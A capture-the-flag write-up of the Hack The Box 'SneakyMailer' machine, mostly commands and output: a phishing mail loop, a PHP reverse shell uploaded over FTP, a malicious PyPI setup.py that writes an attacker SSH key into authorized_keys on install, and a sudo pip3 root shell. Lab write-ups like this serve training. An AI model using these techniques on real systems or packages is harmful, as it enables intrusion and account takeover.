---
title: Hackthebox SneakyMailer writeup
image: /images/sneakymailer/info.png
tags: 
- hackthebox
- writeup
---

This post will be without all those remarks and extra talk. foothold->medium, user->medium, root->easy

<!--more-->

<img src="/images/sneakymailer/info.png">

Nmap Scan

{%highlight text%}
nmap -T4 10.10.10.197
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
25/tcp   open     smtp
80/tcp   open     http
143/tcp  open     imap
993/tcp  open     imaps
4045/tcp filtered lockd
8080/tcp open     http-proxy
{%endhighlight%}

Detailed Nmap Scan

{%highlight text%}
nmap -T4 -A -p21,22,25,80,143,993,4045,8080 10.10.10.197

PORT     STATE  SERVICE  VERSION
21/tcp   open   ftp      vsftpd 3.0.3
22/tcp   open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (EdDSA)
25/tcp   open   smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open   http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open   imap     Courier Imapd (released 2018)
|_imap-capabilities: UIDPLUS CAPABILITY UTF8=ACCEPTA0001 IMAP4rev1 IDLE ACL2=UNION NAMESPACE THREAD=ORDEREDSUBJECT STARTTLS THREAD=REFERENCES CHILDREN QUOTA OK completed ENABLE SORT ACL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
993/tcp  open   ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
4045/tcp closed lockd
8080/tcp open   http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
{%endhighlight%}

Add following entry in /etc/hosts file

`10.10.10.197  sneakycorp.htb`

Browse to website

<img src="/images/sneakymailer/website.png" width="1000">

Open the teams section to find juicy information

<img src="/images/sneakymailer/users.png" width="1000" />

Copy all the text and paste it in a file and run the following command to extract emails.

{%highlight text%}

cat info.txt

Airi Satou 	Accountant 	Tokyo 	airisatou@sneakymailer.htb
Angelica Ramos 	Chief Executive Officer (CEO) 	London 	angelicaramos@sneakymailer.htb
Ashton Cox 	Junior Technical Author 	San Francisco 	ashtoncox@sneakymailer.htb
Bradley Greer 	Tester 	London 	bradleygreer@sneakymailer.htb
Brenden Wagner 	Software Engineer 	San Francisco 	brendenwagner@sneakymailer.htb
Brielle Williamson 	Tester 	New York 	briellewilliamson@sneakymailer.htb
Bruno Nash 	Software Engineer 	London 	brunonash@sneakymailer.htb
Caesar Vance 	Tester 	New York 	caesarvance@sneakymailer.htb
Cara Stevens 	Sales Assistant 	New York 	carastevens@sneakymailer.htb
Cedric Kelly 	Senior Javascript Developer 	Edinburgh 	cedrickelly@sneakymailer.htb
Charde Marshall 	Tester 	San Francisco 	chardemarshall@sneakymailer.htb
Colleen Hurst 	Javascript Developer 	San Francisco 	colleenhurst@sneakymailer.htb
Dai Rios 	Personnel Lead 	Edinburgh 	dairios@sneakymailer.htb
Donna Snider 	Customer Support 	New York 	donnasnider@sneakymailer.htb
Doris Wilder 	Sales Assistant 	Sidney 	doriswilder@sneakymailer.htb
Finn Camacho 	Support Engineer 	San Francisco 	finncamacho@sneakymailer.htb
Fiona Green 	Tester 	San Francisco 	fionagreen@sneakymailer.htb
--snip--

cat info.txt | rev | cut -d' ' -f1 | rev > emails.txt

cat emails.txt

airisatou@sneakymailer.htb
angelicaramos@sneakymailer.htb
ashtoncox@sneakymailer.htb
bradleygreer@sneakymailer.htb
brendenwagner@sneakymailer.htb
briellewilliamson@sneakymailer.htb
brunonash@sneakymailer.htb
caesarvance@sneakymailer.htb
carastevens@sneakymailer.htb
cedrickelly@sneakymailer.htb
chardemarshall@sneakymailer.htb
colleenhurst@sneakymailer.htb
dairios@sneakymailer.htb
donnasnider@sneakymailer.htb
doriswilder@sneakymailer.htb
finncamacho@sneakymailer.htb
fionagreen@sneakymailer.htb
{%endhighlight%}

The image of machine is a fisher and we have a bunch of mails. Grab your rods... we are going phishing.

You can send mails using telnet into the smtp server but that requires many commands to write just one mail. A tool named "swaks" is basically a script to automate the whole telnet process. I write a while loop to loop over all the mails and send them out phishing mail.

{%highlight text%}
while read mails;do ./swaks --to $mails --from mercifulwolf@sneakymailer.htb --body "http://10.10.14.5" --server 10.10.10.197;done < emails.txt

=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO ubuntu
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<lol@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<airisatou@sneakymailer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Fri, 23 Oct 2020 12:20:26 +0530
 -> To: airisatou@sneakymailer.htb
 -> From: mercifulwolf@sneakymailer.htb
 -> Subject: test Fri, 23 Oct 2020 12:20:26 +0530
 -> Message-Id: <20201023122026.011522@ubuntu>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> http://10.10.14.5

 --snip--
{%endhighlight%}

To see if anyone clicks on our link start a netcat listener on port 80.

{%highlight text%}
sudo nc -lvp 80

Listening on [0.0.0.0] (family 0, port 80)
Connection from sneakycorp.htb 59298 received!
POST / HTTP/1.1
Host: 10.10.14.5
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
{%endhighlight%}

Decode the URL encoded password.

{%highlight text%}
email:     paulbyrd@sneakymailer.htb
password:  ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
{%endhighlight%}

Use any email client to login to the IMAP server (used to retrieve the stored mails). I used Claw Mailer which is very lightweight. Below is the config.

<img src="/images/sneakymailer/config.png">

Now you can see two mails in the Sent box.

<img src="/images/sneakymailer/paulbyrd.png">
<img src="/images/sneakymailer/tolow.png">

We have new creds

{%highlight text%}
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
{%endhighlight%}

Try these creds with FTP to successfully login.

{%highlight text%}
ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:lol): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Oct 25 19:29 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
{%endhighlight%}

Looks like the web directory. Lets try putting a shell in there.

{%highlight text%}
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (39.3803 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
--wxrw-rw-    1 1001     1001         5492 Oct 26 01:06 php-reverse-shell.php
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp> quit
221 Goodbye.
{%endhighlight%}

Start a netcat listener and browse to the shell. On browsing it shows not found. Let look for any sub domains using ffuf.

{%highlight text%}
./ffuf -u http://sneakycorp.htb -w subdomains-top1million-5000.txt -H "HOST: FUZZ.sneakycorp.htb" -t 100 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sneakycorp.htb
 :: Wordlist         : FUZZ: subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.sneakycorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
:: Progress: [4997/4997] :: Job [1/1] :: 555 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
{%endhighlight%}

We discover a "dev" subdomain.
Add another entry in /etc/hosts.

`10.10.10.197   dev.sneakycorp.htb`

Try browsing to `http://dev.sneakycorp.htb/php-reverse-shell.php`

{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from sneakycorp.htb 46522 received!
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 01:12:01 up 18:57,  0 users,  load average: 0.02, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{%endhighlight%}

Foothold complete. You can change to the user "developer" using the same creds used for logging into FTP. Running linpeas script we find a hash of password for user pypi.
{%highlight text%}
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
{%endhighlight%}

Cracking it with hashcat and using rockyou.txt we get `soufianeelhaoui`.

Looking around we find another subdomain in the /var/www/ directory - `pypi.sneakycorp.htb`

Add another entry in /etc/hosts

`10.10.10.197   pypi.sneakycorp.htb`

Browse to above link but says not found. Try the port 8080. 

<img src="/images/sneakymailer/pypi.png">

A pypi server is what you use to install python packages using pip. This a private pypi server and as we saw from the mail to the user low, his task is to install the packages and test them i.e the user will run all the packages from the pypi server. 

We will create a malicious  and upload it to pypi server. We can see the ssh service is turned on and the user "low" has the file "authorized_keys" in his home. we will try writing our public key into that file.

Below links show how to create a python package and upload it to the pypi server.

[https://packaging.python.org/tutorials/packaging-projects/](https://packaging.python.org/tutorials/packaging-projects/)

[https://pypi.org/project/pypiserver/#upload-with-setuptools](https://pypi.org/project/pypiserver/#upload-with-setuptools)

I create two files .pypirc and setup.py and store them in a folder in directory named "plswork2" in the /tmp.

.pypirc

{%highlight text%}
[distutils]
index-servers =
  local
  pypi

[pypi]
user: test
password: test

[local]
repository: http://localhost:5000
username: pypi
password: soufianeelhaoui
{%endhighlight%}

setup.py

{%highlight text%}
import setuptools
import os

if os.getuid()==1000:
	with open("/home/low/.ssh/authorized_keys", "a") as f:
		f.write('\nYOUR-PUBLIC-SSH-KEYS')
		f.close()

setuptools.setup(
	name="plswork2", 
	version="0.0.1",
	author="Example Author",
	author_email="author@example.com",
	description="A small example package",
	long_description="long_description",
	long_description_content_type="text/markdown",
	url="https://github.com/pypa/sampleproject",
	packages=setuptools.find_packages(),
	classifiers=[
    	"Programming Language :: Python :: 3",
   		"License :: OSI Approved :: MIT License",
    	"Operating System :: OS Independent",
		],
	python_requires='>=3.6',
)

{%endhighlight%}

We add a check for userid so that when user low run this script only then we will be able to write our key to authorized keys else we will get permission denied error when we first run setup.py.

pypirc file is often stored in home to tell python about the place to upload to. So we will change the home directory to /tmp/plswork2 using
 `export HOME=/tmp/plswork/`
Now we upload our malicious package and run following command from within the directory.

{%highlight text%}
python setup.py sdist upload -r local
{%endhighlight%}

After you see "200 successful" in the response to above command, we can ssh into user low.

{%highlight text%}
ssh -i id_rsa low@10.10.10.197
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105
low@sneakymailer:~$
{%endhighlight%}

Performing basic priv esc methods we do `sudo -l` and we see we can run pip3 as root without having to input password. There is an entry for pip on GTFO bins and we just have to replace "pip" with "pip3" and we are root.

[GTFO bin for pip](https://gtfobins.github.io/gtfobins/pip/#sudo)

{%highlight text%}
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3


low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.RRFGRjnCke
# whoami
root
{%endhighlight%}

From what I understand this exploit creates a python package with malicious setup.py (shell spawning) file which when installed with pip along with sudo privilege, runs the setup.py file as root and gives us a shell.
